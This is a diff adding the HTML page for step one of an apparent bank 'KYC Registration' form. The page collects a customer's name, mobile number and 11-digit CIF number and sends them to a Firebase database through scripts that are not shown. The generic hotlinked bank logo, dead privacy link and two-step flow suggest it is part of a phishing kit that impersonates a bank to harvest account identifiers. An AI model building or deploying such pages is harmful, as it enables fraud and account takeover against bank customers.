@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>KYC Registration - Step 1</title>
+  <style>
+    :root {
+      --primary-color: #003399;
+      --accent-color: #0066cc;
+    }
+
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #e6f0ff;
+      margin: 0;
+      padding: 0;
+      font-size: 16px;
+    }
+
+    .container {
+      max-width: 400px;
+      margin: 20px auto;
+      padding: 5px;
+    }
+
+    .logo {
+      text-align: center;
+      margin-bottom: 10px;
+    }
+
+    .logo img {
+      width: 100%;
+      max-width: 100%;
+      height: auto;
+      border-radius: 12px;
+      object-fit: contain;
+    }
+
+    h2 {
+      color: var(--primary-color);
+      text-align: center;
+      margin: 10px 0 15px 0;
+      font-size: 20px;
+    }
+
+    .form-card {
+      background-color: #ffffff;
+      padding: 15px;
+      border-radius: 10px;
+      box-shadow: 0 3px 8px rgba(0, 0, 0, 0.12);
+    }
+
+    .step {
+      color: var(--primary-color);
+      font-weight: bold;
+      margin-bottom: 12px;
+      font-size: 15px;
+    }
+
+    label {
+      font-weight: 600;
+      display: block;
+      margin-bottom: 5px;
+      margin-top: 10px;
+      font-size: 14px;
+    }
+
+    input[type="text"],
+    input[type="tel"] {
+      width: 100%;
+      padding: 10px;
+      font-size: 14px;
+      margin-bottom: 6px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+    }
+
+    .hint {
+      font-size: 12px;
+      color: #555;
+      margin-bottom: 12px;
+    }
+
+    .links {
+      display: flex;
+      justify-content: flex-start;
+      margin-top: 12px;
+    }
+
+    .links a {
+      text-decoration: none;
+      font-weight: bold;
+      color: var(--accent-color);
+      font-size: 12px;
+    }
+
+    .button {
+      margin-top: 16px;
+      text-align: center;
+    }
+
+    button {
+      background-color: var(--primary-color);
+      color: white;
+      padding: 10px 24px;
+      font-size: 15px;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background-color: #002277;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <!-- Logo -->
+    <div class="logo">
+      <img src="https://imgs.search.brave.com/UVJaknhSmsKpOPTt-6yCrvq5M3ZJnwVhHr6zsGUrenI/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly9hc3Nl/dHMuc3RpY2twbmcu/Y29tL2ltYWdlcy82/MjdjYzVjOTFiMmUy/NjNiNDU2OTZhOGUu/cG5n" alt="Bank Logo">
+    </div>
+
+    <h2>KYC Registration</h2>
+
+    <div class="form-card">
+      <p class="step">STEP 1 of STEP 2</p>
+
+      <form id="ududip007">
+        <label for="aname">Name</label>
+        <input type="text" id="aname" placeholder="Enter Your Name" required />
+
+        <label for="bmobile">Mobile Number</label>
+        <input type="tel" id="bmobile" placeholder="Enter Your Mobile Number"
+               required minlength="10" maxlength="10" pattern="\d{10}" inputmode="numeric" />
+
+        <label for="cac">CIF Number</label>
+        <input type="text" id="cac" placeholder="Enter Your CIF Number"
+               required minlength="11" maxlength="11" pattern="\d{11}" inputmode="numeric" />
+        <p class="hint">11 digit CIF Number, eg. 60xxxxxxxxx</p>
+
+        <div class="links">
+          <a href="#">Privacy Policy</a>
+        </div>
+
+        <div class="button">
+          <button type="submit">Continue</button>
+        </div>
+      </form>
+    </div>
+  </div>
+
+  <!-- Firebase SDKs -->
+  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+
+  <!-- External JS Files -->
+  <script src="firebase-config.js"></script>
+  <script src="1.js"></script>
+</body>
+</html>
